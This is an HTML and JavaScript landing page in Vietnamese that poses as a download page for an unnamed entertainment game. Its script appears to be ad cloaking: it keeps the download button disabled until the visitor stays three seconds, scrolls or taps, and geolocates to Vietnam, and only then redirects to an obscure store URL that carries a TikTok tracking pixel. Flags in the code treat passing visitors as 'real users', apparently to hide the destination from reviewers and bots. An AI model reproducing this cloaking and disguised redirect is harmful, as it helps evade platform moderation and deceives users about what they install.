<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Tải ứng dụng</title>

<style>
body{
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,Roboto,Arial;
  background:#f5f5f7;
  display:flex;
  justify-content:center;
}
.app{
  max-width:420px;
  background:#fff;
  padding:20px;
}
.icon{
  width:96px;height:96px;
  border-radius:22px;
  background:url("icon.png") center/cover no-repeat;
  margin:20px auto;
}
h2{text-align:center;margin:10px 0}
p{text-align:center;color:#666;font-size:14px}

.btn{
  margin-top:20px;
  width:100%;
  padding:14px;
  border:none;
  border-radius:14px;
  font-size:18px;
  background:#c0c0c0;
  color:#fff;
  pointer-events:none;
}
.btn.active{
  background:#0a84ff;
  pointer-events:auto;
}

.screens{
  display:flex;
  gap:10px;
  overflow-x:auto;
  margin-top:20px;
  padding-bottom:5px;
}
.screen{
  flex:0 0 160px;
  height:280px;
  border-radius:14px;
  background-size:cover;
  background-position:center;
}
.note{
  text-align:center;
  color:#888;
  font-size:13px;
  margin-top:10px;
}
</style>
</head>

<body>
<div class="app">

  <div class="icon" id="icon"></div>

  <h2>Game giải trí</h2>
  <p>Phiên bản mới nhất – tương thích Android & iOS</p>

  <button class="btn" id="download">Tải ngay</button>
  <div class="note">Vui lòng chờ vài giây và thao tác</div>

  <!-- ===== 5 SCREEN ===== -->
  <div class="screens">
    <div class="screen" style="background-image:url('screen1.jpg')"></div>
    <div class="screen" style="background-image:url('screen2.jpg')"></div>
    <div class="screen" style="background-image:url('screen3.jpg')"></div>
    <div class="screen" style="background-image:url('screen4.jpg')"></div>
    <div class="screen" style="background-image:url('screen5.jpg')"></div>
  </div>

</div>

<script>
(function(){

/* ===== CONFIG ===== */
const WEB_A = "https://www.120bdt222.com/common/store/4f80366d81/?tiktokPixelId=D4OJ2KJC77UBQQ2RF27G";
const CACHE_KEY = "__real_user_ok__";
const SESSION_TTL = 2 * 60 * 60 * 1000;

/* ===== STATE ===== */
let stayOK=false, actionOK=false, ipOK=false;
const btn = document.getElementById("download");

/* ===== SESSION ===== */
const last = localStorage.getItem(CACHE_KEY);
if(last && Date.now()-last<SESSION_TTL){
  enable();
}

/* ===== STAY >= 3s ===== */
setTimeout(()=>{
  stayOK=true;
  check();
},3000);

/* ===== USER ACTION ===== */
function action(){
  actionOK=true;
  check();
}
window.addEventListener("scroll",action,{once:true});
window.addEventListener("touchstart",action,{once:true});
document.getElementById("icon").addEventListener("click",action,{once:true});

/* ===== IP CHECK (FAIL-OPEN) ===== */
let ipDone=false;
setTimeout(()=>{
  if(!ipDone){
    ipOK=true;
    check();
  }
},1500);

fetch("https://ipapi.co/country",{cache:"no-store"})
.then(r=>r.text())
.then(c=>{
  ipDone=true;
  if((c||"").trim().toUpperCase()==="VN"){
    ipOK=true;
  }
  check();
})
.catch(()=>{
  ipDone=true;
  ipOK=true;
  check();
});

/* ===== CHECK ===== */
function check(){
  if(stayOK && actionOK && ipOK){
    enable();
  }
}

/* ===== ENABLE ===== */
function enable(){
  btn.classList.add("active");
  btn.onclick=()=>{
    localStorage.setItem(CACHE_KEY,Date.now());
    setTimeout(()=>{
      window.location.href = WEB_A;
    },600 + Math.random()*600);
  };
}

})();
</script>
</body>
</html>
